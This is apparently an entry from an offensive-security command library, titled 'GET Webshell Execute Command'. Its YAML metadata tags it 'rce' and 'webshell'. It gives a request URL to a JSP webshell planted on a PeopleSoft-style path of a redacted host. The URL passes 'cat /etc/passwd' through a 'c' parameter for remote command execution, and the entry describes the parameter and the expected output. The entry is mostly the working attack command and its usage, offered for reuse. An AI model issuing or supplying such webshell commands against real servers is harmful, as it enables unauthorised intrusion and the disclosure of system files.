---
data: 'https://██████/PSIGW/PVrIiSDNAQlOQubhYHDE.jsp?c=cat%20/etc/passwd'
tags:
  - rce
  - webshell
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 84827a5c-cab7-43dd-a859-749f027bd792
created_at: '2025-12-13T09:00:28.133Z'
updated_at: '2025-12-13T09:00:28.133Z'
verified: false
validated: true
submitted: true
---
# GET Webshell Execute Command

## Command

```bash
https://██████/PSIGW/PVrIiSDNAQlOQubhYHDE.jsp?c=cat%20/etc/passwd
```

## Description

Accesses JSP shell and executes a command via 'c' parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `c` | Command to execute, e.g., cat /etc/passwd | Yes |

## Examples

### Basic Usage

```bash
https://██████/PSIGW/PVrIiSDNAQlOQubhYHDE.jsp?c=cat%20/etc/passwd
```

## Expected Output

Contents of /etc/passwd.

## Related

- [[procedures/Execute-Commands-via-Deployed-Webshell]]
